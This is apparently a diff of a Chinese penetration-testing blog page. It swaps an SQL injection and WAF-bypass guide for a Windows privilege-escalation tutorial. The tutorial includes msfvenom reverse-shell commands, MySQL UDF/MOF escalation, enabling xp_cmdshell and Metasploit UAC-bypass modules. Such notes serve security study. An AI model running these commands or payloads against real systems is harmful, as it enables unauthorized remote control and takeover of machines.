@@ -18,17 +18,17 @@
   <link 
     rel="icon" 
     href="/img/favicon.png">
-  <title>SQL注入思路整理</title>
+  <title>Windows提权</title>
   
     
       <meta 
         property="og:title" 
-        content="SQL注入思路整理">
+        content="Windows提权">
     
     
       <meta 
         property="og:url" 
-        content="https://www.zerochen.top/article/SQL%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/index.html">
+        content="https://www.zerochen.top/article/Windows%E6%8F%90%E6%9D%83/index.html">
     
     
       <meta 
@@ -42,10 +42,10 @@
         content="article">
       <meta 
         property="og:article:published_time" 
-        content="2021-07-21">
+        content="2021-08-28">
       <meta 
         property="og:article:modified_time" 
-        content="2021-08-09">
+        content="2021-08-28">
       <meta 
         property="og:article:author" 
         content="沉墨">
@@ -53,7 +53,7 @@
         
           <meta 
             property="og:article:tag" 
-            content="SQL注入">
+            content="提权">
         
       
     
@@ -266,30 +266,30 @@
 <article class="card card-content">
   <header>
     <h1 class="post-title">
-      SQL注入思路整理
+      Windows提权
     </h1>
   </header>
   <div class="post-meta post-show-meta">
-    <time datetime="2021-07-21T09:10:24.000Z">
+    <time datetime="2021-08-28T11:57:22.000Z">
       <i 
         class="iconfont icon-calendar" 
         style="margin-right: 2px;">
       </i>
-      <span>2021-07-21</span>
+      <span>2021-08-28</span>
     </time>
     
       <span class="dot"></span>
       
         <a 
-          href="/categories/Web%E6%B8%97%E9%80%8F/" 
+          href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" 
           class="post-meta-link">
-          Web渗透
+          内网渗透
         </a>
       
     
     
       <span class="dot"></span>
-      <span>1.8k 字</span>
+      <span>1.7k 字</span>
     
   </div>
   
@@ -304,9 +304,9 @@
         
           
           <a 
-            href="/tags/SQL%E6%B3%A8%E5%85%A5/" 
+            href="/tags/%E6%8F%90%E6%9D%83/" 
             class="post-meta-link">
-            SQL注入
+            提权
           </a>
         
       </div>
@@ -316,164 +316,377 @@
   <div 
     id="section" 
     class="post-content">
-    <h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>本篇只介绍思路，不做详细注入语句讲解。</p>
-<h1 id="二、SQL注入产生原因"><a href="#二、SQL注入产生原因" class="headerlink" title="二、SQL注入产生原因"></a>二、SQL注入产生原因</h1><p>用户输入处理不当，用户数据被当做SQL语句执行。</p>
-<h1 id="三、注入类型"><a href="#三、注入类型" class="headerlink" title="三、注入类型"></a>三、注入类型</h1><table>
-<thead>
-<tr>
-<th align="left">分类标准</th>
-<th align="left">分类</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">根据请求方式分类</td>
-<td align="left">GET方式注入 POST方式注入</td>
-</tr>
-<tr>
-<td align="left">根据注入点参数分类</td>
-<td align="left">整数型注入 字符型注入 搜索型注入</td>
-</tr>
-<tr>
-<td align="left">根据反馈类型分类</td>
-<td align="left">union联合查询注入 报错注入 布尔盲注 时间盲注 其他类型 （如请求头注入、内联注入、二次编码注入、宽字节注入、堆叠注入、二阶注入等）</td>
-</tr>
-<tr>
-<td align="left">根据数据库类型分类</td>
-<td align="left">Mysql、MSSql、Oracle、Access、MongoDB等</td>
-</tr>
-</tbody></table>
-<h1 id="四、SQL注入思路"><a href="#四、SQL注入思路" class="headerlink" title="四、SQL注入思路"></a>四、SQL注入思路</h1><h2 id="1、发现注入点"><a href="#1、发现注入点" class="headerlink" title="1、发现注入点"></a>1、发现注入点</h2><p><strong>注入点</strong></p>
-<p>所有存在<strong>可变参数</strong>且<strong>代入数据</strong>库中执行的数据</p>
-<p>如：url中的?id=、页面中的搜索框、POST数据包中的可变参数、数据头中的UA、X-Forward-For等</p>
-<p><strong>判断：</strong></p>
-<p>在参数后加单引号、双引号、斜杠<code>&#39;、&quot;、\</code>，全部加。</p>
-<p>若页面异常，则可能存在注入；</p>
-<p>若页面无变化，则使用延时函数，判断是否存在时间延时盲注（各大数据库通用）；其中，在mysql数据库中，需要额外判断宽字节注入、二次编码注入。若页面存在延时刷新、报错，可能存在sql注入。</p>
-<h2 id="2、判断闭合符"><a href="#2、判断闭合符" class="headerlink" title="2、判断闭合符"></a>2、判断闭合符</h2><p>使用不报错的闭合符（<code>&#39;或&quot;</code>）,加上注释符（不同数据库不同，但<code>-- a</code>几乎可以通用：mysql中为–空格,mssql和oracle为–，access无注释符号）</p>
-<p>注意：</p>
-<p>mysql为<code>?id=1&#39; -- a</code>形式</p>
-<p>mssql、oracle、access均为<code>?id=1&#39; and 1=1/1=2 --</code>形式（1=1正常、1=2异常）</p>
-<p>若页面返回正常，则单或双引号即为闭合符；若页面依然异常，则在单或双引号后添加<code>)</code>，直至页面恢复正常。添加部分与单或双引号组成闭合符。</p>
-<p>注意：需要结合语境，判断可能使用的sql语句，更加容易判断闭合符。如搜索型语句处（多存在搜索框处），可能会使用like关键词，需要使用%闭合，构造形如<code>%&#39;and &#39;%&#39;=&#39;</code>的闭合语句进行闭合判断。</p>
-<h2 id="3、判断数据库类型"><a href="#3、判断数据库类型" class="headerlink" title="3、判断数据库类型"></a>3、判断数据库类型</h2><p>在进行注入前，需要判断数据库类型，从而选择合适的注入语句。使用每个数据库独有的一个或多个语法、函数进行判断。</p>
-<p>简单列举，够用即可。</p>
+    <p>提权方式</p>
+<p>1、系统漏洞提权 *</p>
+<p>2、数据库提权 *</p>
+<p>3、第三方软件提权</p>
+<p>4、系统配置错误提权</p>
+<pre class="highlight"><span class="line">脚本提权</span><br><span class="line">数据库提权</span><br><span class="line">	mysql:mof、udf</span><br><span class="line">	mssql:xp_cmdshell</span><br><span class="line">开机启动项提权</span><br><span class="line">	用户开机启动项</span><br><span class="line">	系统开机启动项</span><br><span class="line">bypass_uac提权</span><br><span class="line">	进程注入</span><br><span class="line">	内存注入</span><br><span class="line">	注册表劫持</span><br></pre>
+
+
+
+<p>用户+组</p>
 <table>
 <thead>
 <tr>
-<th align="left">数据库类型</th>
-<th align="left">注释</th>
-<th align="left">函数</th>
+<th></th>
+<th></th>
 </tr>
 </thead>
 <tbody><tr>
-<td align="left">mysql</td>
-<td align="left">– a</td>
-<td align="left">version()、@@version、length()</td>
+<td>组</td>
+<td>administrators  管理员组，最高权限  <br>任何用户加入这个组，就有管理员权限，可以开关机、远程桌面、修改配置等    <br>users  用户组  <br>普通账户，通过屏幕登录系统，不能远程登录     <br>remote desktops groups  远程桌面组  <br>远程桌面组，用户加入后，可以3389登录     <br>电源管理、开关机、磁盘…组</td>
 </tr>
 <tr>
-<td align="left">mssql</td>
-<td align="left">–</td>
-<td align="left">@@version、len()、?id=1’ and exists (select * from sysobjects)&gt;0 – 返回正常</td>
-</tr>
-<tr>
-<td align="left">oracle</td>
-<td align="left">–</td>
-<td align="left">banner from sys.v_$version、length()</td>
-</tr>
-<tr>
-<td align="left">access</td>
-<td align="left">无</td>
-<td align="left">and exists (select * from msysobjects)&gt;0 返回正常</td>
+<td>用户</td>
+<td>server系统：  <br>administrator  管理员，最高权限用户     <br>Guest  来宾账户，默认禁用     <br>注意：  server 2012-2019中，administrator与Guest都默认禁用  <br>安装系统时设置激活状态账户，在机房与云服务器中，默认设置administrator为激活账户     <br>desktop系统： <br>windows7及以后  安装系统时，设置自定义激活账户，加入管理员组</td>
 </tr>
 </tbody></table>
-<p>注：注释处为两个英文输入法的短横杠，非单横杠（显示问题）</p>
-<h2 id="4、选择注入方式"><a href="#4、选择注入方式" class="headerlink" title="4、选择注入方式"></a>4、选择注入方式</h2><p>根据页面回显情况，选择通用注入方式：</p>
-<p>1&gt;首选union联合查询。要求：有回显位。</p>
-<p>2&gt;次选报错注入。要求：页面异常为报错信息。</p>
-<p>3&gt;最后是盲注。若页面只有正常和单一异常两种回显，选择布尔盲注；若页面无回显，选择时间盲注。</p>
-<h2 id="5、结合WAF确定注入语句"><a href="#5、结合WAF确定注入语句" class="headerlink" title="5、结合WAF确定注入语句"></a>5、结合WAF确定注入语句</h2><p>结合4，同一处注入点可以有多重注入手法，若是没有waf，按照优先级进行选择即可。若是有waf，需要结合绕waf选择注入方式。同时，在判断时，也可以尝试绕waf。</p>
-<p>1&gt;首先，判断and、or、空格是否存在waf拦截。</p>
-<p>2&gt;然后，按照注入手法优先级，将用到的关键词（如：order by、union select等）单独放入注入语句进行判断。</p>
-<p><strong>优先绕过waf，其次换可替代的关键词、最后换注入方式</strong>。</p>
-<p>3&gt;最后，根据waf拦截方式，确定注入语句，依次注出当前数据库名、表名、字段名、数据即可。文末附上常见绕waf方式。</p>
-<p>注意：</p>
-<p>若为mysql数据库，可进行以下判断</p>
-<pre class="highlight"><span class="line">--os-shell可对网站进行getshell，但是存在以下前提条件</span><br><span class="line">1、存在sql注入</span><br><span class="line">2、知道网站绝对路径</span><br><span class="line">3、拥有数据库权限（dba权限），也可以使用sqlmap的--is-dba判断</span><br><span class="line">4、数据库配置文件secure_file_priv未设置或设置为可读写的已知路径</span><br></pre>
-
-<p>4&gt;其他：</p>
-<p>时间延时盲注可用DNS外带节省注入时间，放在其他文章中再做讲述。</p>
-<h1 id="五、SQL注入防御"><a href="#五、SQL注入防御" class="headerlink" title="五、SQL注入防御"></a>五、SQL注入防御</h1><table>
-<thead>
-<tr>
-<th align="left">方式</th>
-<th align="left">说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">去掉单引号</td>
-<td align="left">现实场景常用单引号，去掉不合实际</td>
-</tr>
-<tr>
-<td align="left">转义单引号</td>
-<td align="left">对数字型无效（数字型不需要引号） 斜杠转义 addslashes()函数转义 php.ini配置文件转义（5.6以下版本开启magic_quotes_gpc = On）</td>
-</tr>
-<tr>
-<td align="left">强制类型转换</td>
-<td align="left">针对数字型 intval()</td>
-</tr>
-<tr>
-<td align="left">更改数据库连接方式</td>
-<td align="left">POD连接数据库将变量转换成字符串，再写入数据库，无法拼接</td>
-</tr>
-</tbody></table>
-<h1 id="六、WAF绕过"><a href="#六、WAF绕过" class="headerlink" title="六、WAF绕过"></a>六、WAF绕过</h1><p>sql语法特性 + http特性 + waf缺陷 = waf绕过</p>
-<p>1、大小写绕过（现今几乎无效）</p>
-<p>2、替换关键字<br>1&gt; 关键字双写（代码级别waf有效）<br>2&gt; 同价词替换，针对特殊关键词拦截的情况</p>
-<pre class="highlight"><span class="line">and --&gt; &amp;&amp;</span><br><span class="line">or --&gt; ||</span><br><span class="line">= --&gt; &lt;、&gt;</span><br><span class="line">空格 --&gt; %20、%09、%0a、%0b、%0c、%0d、%a0、//</span><br></pre>
-
-<p> 3&gt; 特殊字符拼接（mssql支持拼接、mysql不支持拼接）<br>​ ‘test1’+’test2’<br>​<br>3、编码绕过<br>常见的sql编码有unicode、hex、url、ascii、base64等<br>​ 1&gt;url编码（或者二次编码）<br>​ 2&gt;unicode编码（改/为%）<br>​ 常见unicode编码<br>​ 单引号：<code>%u0027</code><br>​ 空格：<code>%u0020</code><br>​ 左括号：<code>%u0028</code><br>​ 右括号：<code>%u0029</code><br>​<br>4、注释绕过<br>利用语言函数特性来绕过waf规则<br>常见注释符：<br><code>//、--、//、#、--+、---、;、--a</code><br>​ 1&gt;普通注释<br>​ <code>/**/</code>在构造查询中插入注释，规避对空格的依赖或关键字识别<br>​ 2&gt;内联注释<br>​ <code>/*!*/</code>表示注释里面的语句会被执行（只有MYSQL能识别）<br>​ <code>/*!50001 select * from test*/</code>表示数据库5.00.01以上版本才会执行该语句<br>​<br>5、参数污染<br>当同一参数出现多次，不同中间件会解析为不同结果。如果WAF只检测了同名参数中的第一个或最后一个，并且中间件特征正好取与WAF相反的参数，则可成功绕过</p>
+<p>权限</p>
+<p>Guest -&gt; 普通账户 -&gt; 电源管理、计划任务… -&gt; administrator -&gt; system</p>
+<p>network server（网络权限，低）、local server（本地权限，高）</p>
+<p>在服务（本地） -&gt; 属性 -&gt;登录中可更改系统账户或自定义账户，更改服务运行的权限</p>
+<p>提权流程</p>
 <table>
 <thead>
 <tr>
-<th align="left">服务器中间件</th>
-<th align="left">解析结果</th>
-<th>举例</th>
+<th>获得目标机shell</th>
+<th></th>
 </tr>
 </thead>
 <tbody><tr>
-<td align="left">ASP.NET/IIS</td>
-<td align="left">所有出现的参数值用逗号连接</td>
-<td>par1=var1,val2</td>
+<td>查看目标机补丁记录</td>
+<td>systeminfo -&gt; 修补程序     <br>漏洞发布时间：2019-12  <br>操作系统发布时间：新版本不受影响  <br>漏洞影响范围：全版本  <br>补丁编号：KB4525235  <br>系统安装时间：最新安装的可能包含更多补丁  <br>补丁包：多个补丁合集，不知道具体补丁版本     <br><br>注意：  vps中集成最新补丁，查看不到补丁版本，且可能无法提权</td>
 </tr>
 <tr>
-<td align="left">ASP/IIS</td>
-<td align="left">所有出现的参数值用逗号连接</td>
-<td>par1=var1,var2</td>
+<td>寻找对应的EXP</td>
+<td>补丁与提权脚本在线转换：  <br><a target="_blank" rel="noopener" href="http://blog.neargle.com/win-powerup-exp-index/#">http://blog.neargle.com/win-powerup-exp-index/#</a>  (对应信息较旧)     <br>根据补丁查找脚本：  <br>github搜索windows-kernel  <br>如：     <br><a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a> 提权脚本*  <br>exploit-db.com 漏洞库</td>
 </tr>
 <tr>
-<td align="left">PHP/Apache</td>
-<td align="left">仅最后一次出现的参数值</td>
-<td>par1=var2</td>
-</tr>
-<tr>
-<td align="left">JSP/Tomcat</td>
-<td align="left">仅最后一次出现的参数值</td>
-<td>par1=val1</td>
-</tr>
-<tr>
-<td align="left">Perl CGI/Apache</td>
-<td align="left">仅第一次出现参数值</td>
-<td>par1=var1</td>
+<td>使用EXP进行提权</td>
+<td>注意查看脚本说明：<br>编译、使用方法等</td>
 </tr>
 </tbody></table>
-<p>如：</p>
-<pre class="highlight"><span class="line">/index.aspx?id=select 1,2,3 from table</span><br><span class="line">--&gt;</span><br><span class="line">/index.aspx?id=select 1&amp;id=,2,3 from table</span><br></pre>
+<p>msf提权</p>
+<table>
+<thead>
+<tr>
+<th>方法</th>
+<th>语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>开启两个终端</td>
+<td>ctrl+shift+F1~F7</td>
+</tr>
+<tr>
+<td>其中运行此命令</td>
+<td>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.21.23  lport=1111 -f psh-cmd  <br>无文件落地，直接执行  <br><br>或  <br>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.21.23  lport=1111 -f exe -o msf.exe  <br>生成文件</td>
+</tr>
+<tr>
+<td>另一个进入msfconsole，开启监听(设置session)</td>
+<td>use  exploit/multi/handler  set  payload windows/meterpreter/reverse_tcp  <br>set  lhost 0.0.0.0  set  lport 1111  <br>set exitonsession false     允许建立多个会话 <br>run</td>
+</tr>
+</tbody></table>
+<p>常用meterpreter命令</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>systeminfo</td>
+<td>查看系统信息</td>
+</tr>
+<tr>
+<td>getuid</td>
+<td>查看当前权限</td>
+</tr>
+<tr>
+<td>getsystem</td>
+<td>自动提权</td>
+</tr>
+<tr>
+<td>upload  x</td>
+<td>传文件</td>
+</tr>
+<tr>
+<td>shell</td>
+<td>切换至命令行版本</td>
+</tr>
+</tbody></table>
+<p>常用msf命令</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>search</td>
+<td>搜索</td>
+</tr>
+<tr>
+<td>use  id</td>
+<td>使用脚本</td>
+</tr>
+<tr>
+<td>show  options</td>
+<td>显示参数</td>
+</tr>
+<tr>
+<td>set  x</td>
+<td>设置参数</td>
+</tr>
+<tr>
+<td>run</td>
+<td>启动</td>
+</tr>
+<tr>
+<td>sessions</td>
+<td>查看会话</td>
+</tr>
+<tr>
+<td>sessions  id</td>
+<td>使用session</td>
+</tr>
+</tbody></table>
+<p>windows数据库提权</p>
+<p>前提：获得Mysql的root权限且数据库以system权限运行</p>
+<p>核心：文件导出功能</p>
+<p>前提：（mof提权、udf提权、开机启动项提权）</p>
+<p>拥有mysql的root权限</p>
+<p>mysql以system运行</p>
+<p>写文件开关开启</p>
+<table>
+<thead>
+<tr>
+<th>说明</th>
+<th>方法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>mof提权</td>
+<td>c:/windows/system32/wbem/mof  <br>mof编程语法，可写脚本，脚本每分钟执行一次  <br>注：windows 2003、xp可用，需要有读写权限     <br><br>二进制形式读取内容，使用  <br><code>select unhex(&#39;xxx&#39;) into dumpfile &#39;x/mof/x.mof&#39;</code>语句写入  可以增加账号（每个文件只能执行一条语句）或者执行后门文件</td>
+</tr>
+<tr>
+<td>UDF提权</td>
+<td>通过自定义函数提权  使用前提、payload见udf.txt文件</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>数据库版本</th>
+<th>操作系统</th>
+<th>udf.dll文件导出路径</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&lt;5.0</td>
+<td>所有操作系统</td>
+<td>导出路径随意</td>
+</tr>
+<tr>
+<td>&lt;=5.1</td>
+<td>windows2003     <br>windows2000</td>
+<td>c:\windows\system32\udf.dll  <br>c:\winnt\system32\udf.dll</td>
+</tr>
+<tr>
+<td>&gt;5.1</td>
+<td>所有操作系统</td>
+<td>MySQL安装目录下的\lib\plugin\udf.dll</td>
+</tr>
+</tbody></table>
+<p>注：</p>
+<p> /lib/plugin目录本身是不存在的，可以利用NTFS ADS流来创建文件夹</p>
+<pre class="highlight"><span class="line">select &#x27;xxx&#x27; into dumpfile &#x27;MySQL目录\\lib::$INDEX_ALLOCATION&#x27;;</span><br><span class="line"></span><br><span class="line">select &#x27;xxx&#x27; into dumpfile &#x27;MySQL目录\\lib\\plugin::$INDEX_ALLOCATION&#x27;;</span><br></pre>
 
-<p>6、缓冲区溢出<br>许多WAF是C语言写的，而C语言本身没有缓冲区保护机制，如果WAF在处理测试向量时超出了其缓冲区长度，会引发bug从而实现绕过<br>如：</p>
-<pre class="highlight"><span class="line">?id=1 and (select 1)=(select 0xAAAAAA*1000 more A)+union select 1,2version()-- a</span><br></pre>
+<p>常用mysql查询语句</p>
+<table>
+<thead>
+<tr>
+<th>语句</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>select  version();</td>
+<td>查看版本</td>
+</tr>
+<tr>
+<td>show  variables like ‘%version_compile_os%’;</td>
+<td>查看位数</td>
+</tr>
+<tr>
+<td>select @@datadir</td>
+<td>查看数据库安装路径</td>
+</tr>
+<tr>
+<td>show  variables like ‘%plugin%’</td>
+<td>查看插件路径</td>
+</tr>
+<tr>
+<td>show  variables like ‘%secure%’</td>
+<td>查看是否可读写文件</td>
+</tr>
+<tr>
+<td>create  FUNCTION sys_eval RETURNS string SONAME ‘x.dll’</td>
+<td>使用dll文件创建函数</td>
+</tr>
+<tr>
+<td>select  sys_eval(‘whoami’)</td>
+<td>执行命令</td>
+</tr>
+<tr>
+<td>DROP  FUNCTION sys_eval</td>
+<td>删除函数</td>
+</tr>
+</tbody></table>
+<p>UDF提权步骤</p>
+<table>
+<thead>
+<tr>
+<th>说明</th>
+<th>语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>查看数据库版本</td>
+<td>select  version();</td>
+</tr>
+<tr>
+<td>查看数据库位数</td>
+<td>show variables like  ‘%version_compile_os%’;</td>
+</tr>
+<tr>
+<td>查看安装路径</td>
+<td>select @@datadir;</td>
+</tr>
+<tr>
+<td>查看插件路径</td>
+<td>show variables like ‘%plugin%’;</td>
+</tr>
+<tr>
+<td>新建插件目录  （若是不存在）</td>
+<td>select ‘xxx’ into dumpfile  ‘c:\phpStudy\MySQL\lib::$INDEX_ALLOCATION’;  select ‘xxx’  into dumpfile ‘c:\phpStudy\MySQL\lib\plugin::$INDEX_ALLOCATION’;</td>
+</tr>
+<tr>
+<td>根据数据库版本、位数选择payload</td>
+<td>select unhex(‘4D5A900…00000000’) into dumpfile  ‘c:\phpStudy\MySQL\lib\plugin\11.dll’;</td>
+</tr>
+<tr>
+<td>使用dll文件创建命令执行函数</td>
+<td>CREATE FUNCTION sys_eval RETURNS string  SONAME ‘11.dll’;</td>
+</tr>
+<tr>
+<td>执行命令</td>
+<td>select sys_eval(‘whoami’);</td>
+</tr>
+</tbody></table>
+<p>sqlmap提权</p>
+<pre class="highlight"><span class="line">pip install pymysql</span><br><span class="line"></span><br><span class="line">sqlmap -d mysql://root:root@x.x.x.x:3306/mysql --os-shell --batch</span><br></pre>
 
-<p>7、整合绕过<br>绕过技术结合使用</p>
-<p>8、分块传输绕过<br>burpsuite中更实用post传输数据，设置<code>Transfer-encoding: chunked</code><br>使用换行分割数据</p>
+
+
+<p>开机启动项提权（&gt;2008）</p>
+<p>bat、vbs、ps1、exe脚本</p>
+<table>
+<thead>
+<tr>
+<th>路径</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>用户目录下开机启动项  <br>C:\Users\Default\AppData\Roaming\Microsoft\Windows\Start  Menu\Programs</td>
+<td>用户目录下的开机启动项只有在该用户登录时才会启动，重启无法触发。</td>
+</tr>
+<tr>
+<td>系统开机启动项     <br>C:\ProgramData\Microsoft\Windows\Start Menu\Programs</td>
+<td>开机启动</td>
+</tr>
+</tbody></table>
+<p>MSSQL数据库提权</p>
+<p>默认xp_cmd处于关闭状态</p>
+<table>
+<thead>
+<tr>
+<th>语句</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>select  count(*) from master.dbo.sysobjects where xtype=”x” and  name=”xp_cmdshell”</td>
+<td>判断是否开启xp_cmdshell</td>
+</tr>
+<tr>
+<td>exec  sp_configure ‘show advanced options’,1;</td>
+<td>允许修改高级参数</td>
+</tr>
+<tr>
+<td>reconfigure;</td>
+<td>刷新配置</td>
+</tr>
+<tr>
+<td>exec  sp_configure ‘xp_cmdshell’,1;</td>
+<td>打开xp_cmdshell拓展</td>
+</tr>
+<tr>
+<td>reconfigure;</td>
+<td>刷新配置</td>
+</tr>
+<tr>
+<td>sa账户、mssql以system运行</td>
+<td>exec  master.dbo.xp_cmdshell ‘whoami’;  <br>或  <br>exec  xp_cmdshell ‘whoami’;</td>
+</tr>
+</tbody></table>
+<p>Bypass UAC</p>
+<p>使用MSF绕过</p>
+<table>
+<thead>
+<tr>
+<th>payload</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>exploit/windows/local/bypassuac</td>
+<td>bypassuac  模块将通过进程注入，利用受信任的发布者证书绕过Windows UAC，它将为我们生成另一个关闭UAC的shell</td>
+</tr>
+<tr>
+<td>exploit/windows/local/bypassuac_injection   (内存注入)</td>
+<td>bypassuac_injection  模块直接运行在内存的反射DLL中，不会接触目标机的硬盘，从而降低了被杀毒软件检测出来的概率</td>
+</tr>
+<tr>
+<td>exploit/windows/local/bypassuac_eventvwr</td>
+<td>bypassuac_eventvwr  模块通过在当前用户配置单元下劫持注册表中的特殊键，在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10  UAC</td>
+</tr>
+</tbody></table>
+<p>使用</p>
+<table>
+<thead>
+<tr>
+<th>说明</th>
+<th>语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>bypassuac模块</td>
+<td>use  exploit/windows/local/bypassuac  <br>set payload  windows/meterpreter/reverse_tcp  set lhost _ip  <br>set session _id  <br>run</td>
+</tr>
+<tr>
+<td>RunAs 模块  (会弹窗，需要手动确定，不推荐)</td>
+<td>use  exploit/windows/local/ask  set session _id  run</td>
+</tr>
+<tr>
+<td>CVE-2019- 1388实现bypass  UAC</td>
+<td>下载地址（HHUPD.EXE）     <br><a target="_blank" rel="noopener" href="https://github.com/jas502n/CVE-2019-1388">https://github.com/jas502n/CVE-2019-1388</a>  <br>在目标机器中双击运行，点击另存网页，打开cmd,即可获得管理员权限</td>
+</tr>
+</tbody></table>
 
   </div>
   <div>
@@ -493,8 +706,8 @@
           <span style="font-weight: bold;">文章链接：</span><a 
             target="_blank" 
             rel="nofollow noopener noreferrer" 
-            href="https://www.zerochen.top/article/SQL%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/">
-            https://www.zerochen.top/article/SQL%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/
+            href="https://www.zerochen.top/article/Windows%E6%8F%90%E6%9D%83/">
+            https://www.zerochen.top/article/Windows%E6%8F%90%E6%9D%83/
           </a>
         </p>
         <p><span style="font-weight: bold;">版权声明：</span>转载请注明出处！</p>
@@ -506,13 +719,13 @@
   
     <div class="nav-item-prev">
       <a 
-        href="/article/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" 
+        href="/article/Linux%E6%8F%90%E6%9D%83/" 
         class="nav-link">
         <i class="iconfont icon-left nav-prev-icon"></i>
         <div>
           <div class="nav-label">上一篇</div>
           
-            <div class="nav-title">文件包含漏洞 </div>
+            <div class="nav-title">Linux提权 </div>
           
         </div>
       </a>
@@ -521,12 +734,12 @@
   
     <div class="nav-item-next">
       <a 
-        href="/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/" 
+        href="/article/%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/" 
         class="nav-link">
         <div>
           <div class="nav-label">下一篇</div>
           
-            <div class="nav-title">Pocsuite3重写redis脚本 </div>
+            <div class="nav-title">入侵排查 </div>
           
         </div>
         <i class="iconfont icon-right nav-next-icon"></i>
@@ -580,7 +793,7 @@
     style="padding-right: 2px;">
   </i>目录
 </div>
-<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%AE%80%E4%BB%8B"><span class="toc-text">一、简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SQL%E6%B3%A8%E5%85%A5%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0"><span class="toc-text">二、SQL注入产生原因</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-text">三、注入类型</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81SQL%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF"><span class="toc-text">四、SQL注入思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E5%8F%91%E7%8E%B0%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">1、发现注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E7%AC%A6"><span class="toc-text">2、判断闭合符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B"><span class="toc-text">3、判断数据库类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E9%80%89%E6%8B%A9%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F"><span class="toc-text">4、选择注入方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E7%BB%93%E5%90%88WAF%E7%A1%AE%E5%AE%9A%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5"><span class="toc-text">5、结合WAF确定注入语句</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94%E3%80%81SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1"><span class="toc-text">五、SQL注入防御</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81WAF%E7%BB%95%E8%BF%87"><span class="toc-text">六、WAF绕过</span></a></li></ol>
+
 </div></main>
             <aside class="left-column">
               
@@ -626,7 +839,7 @@
     style="padding-right: 2px;">
   </i>目录
 </div>
-<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%AE%80%E4%BB%8B"><span class="toc-text">一、简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SQL%E6%B3%A8%E5%85%A5%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0"><span class="toc-text">二、SQL注入产生原因</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-text">三、注入类型</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81SQL%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF"><span class="toc-text">四、SQL注入思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E5%8F%91%E7%8E%B0%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">1、发现注入点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E7%AC%A6"><span class="toc-text">2、判断闭合符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B"><span class="toc-text">3、判断数据库类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 